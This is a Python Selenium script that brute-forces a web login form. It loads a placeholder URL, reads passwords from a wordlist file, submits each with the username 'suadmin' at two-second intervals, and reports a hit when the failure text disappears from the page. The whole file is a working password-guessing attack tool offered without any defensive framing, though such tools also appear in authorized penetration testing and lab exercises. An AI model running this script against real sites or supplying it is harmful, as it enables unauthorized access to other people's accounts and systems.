from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

options = webdriver.FirefoxOptions()
#options.add_argument('--headless')
driver = webdriver.Firefox(options=options)
driver.get("domain")
WORD_LIST = "words.txt"
INTERVAL = 2
FAIL_MESSAGE = "Username"

#driver.quit()
class Authenticate:
    def login(self,username,password):
        username_field = driver.find_element("name", "username")
        password_field = driver.find_element("name", "password")
        username_field.clear()
        password_field.clear()
        username_field.send_keys(username)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        if(self.check_out_put() == True):
            print("[+]["+password+"][Success]")
            quit()
        else:
            print("[-]["+password+"][Failed]")
        
    def check_out_put(self):
        html = driver.page_source
        if FAIL_MESSAGE in html:
            return False
        else:
            return True

class Load:
    def __init__(self) -> None:
        authenticate = Authenticate()
        self.authenticate = authenticate
        pass
    
    def word_list(self):
        with open(WORD_LIST, 'r') as file:
            for password in file:
                self.authenticate.check_out_put()
                self.authenticate.login('suadmin',password)
                time.sleep(INTERVAL)

class Main:
    
    def __init__(self) -> None:
        load = Load()
        self.load = load
        pass
    def start(self):
        self.load.word_list()

main = Main()
main.start()
        
